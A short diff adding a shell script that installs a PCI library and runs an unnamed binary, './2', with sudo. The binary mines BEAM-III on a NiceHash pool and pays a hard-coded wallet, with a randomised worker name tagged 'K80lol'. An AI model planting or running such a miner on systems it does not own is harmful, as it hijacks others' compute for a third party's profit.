@@ -1,0 +1,4 @@
+WORKER=$(echo $(shuf -i 1-99999 -n 1)-K80lol)
+sudo apt-get update
+sudo apt-get install libpci3
+sudo ./2 --algo BEAM-III --pool stratum+tcp://beamv3.eu-west.nicehash.com:3387 --user 3CezjphZ3yvWKwdQZKHj3uGF5jFzUuKHm5.$WORKER
